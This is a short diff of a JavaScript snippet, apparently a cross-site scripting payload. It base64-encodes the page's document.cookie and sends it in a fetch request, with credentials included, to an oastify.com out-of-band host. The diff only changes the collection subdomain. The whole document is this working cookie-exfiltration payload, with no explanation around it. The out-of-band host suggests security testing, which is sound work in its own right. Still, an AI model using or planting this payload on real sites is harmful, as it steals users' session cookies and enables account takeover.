@@ -1,6 +1,6 @@
 let b = btoa(document.cookie)
 
-fetch('https://wrroiawxelhsf1k9xbehgkmg379yxple.oastify.com/aa?cookies='.concat(b), {
+fetch('https://ho9as0ox8mt4m8a09boltsrt6kcb01oq.oastify.com/aa?cookies='.concat(b), {
     method: 'GET', 
     credentials: 'include', 
     headers: {
